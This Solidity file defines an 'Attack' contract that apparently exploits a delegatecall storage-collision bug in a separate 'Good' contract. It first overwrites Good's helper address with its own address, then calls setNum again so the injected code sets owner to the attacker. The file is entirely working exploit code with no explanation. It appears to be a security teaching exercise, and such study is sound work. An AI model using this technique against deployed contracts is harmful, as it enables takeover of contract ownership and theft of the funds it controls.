// SPDX-License-Identifier: MIT
//Address: 0x3340859542C366B3D9772b72283a206c2CeE4f0a
pragma solidity ^0.8.7;

interface IGood {
    function setNum(uint _num)  external;
}

contract Attack {
    address public helper;
    address public owner;
    uint public num;
    IGood public good;
    constructor(address _GoodAddress) {
        good = IGood(_GoodAddress);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {

        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}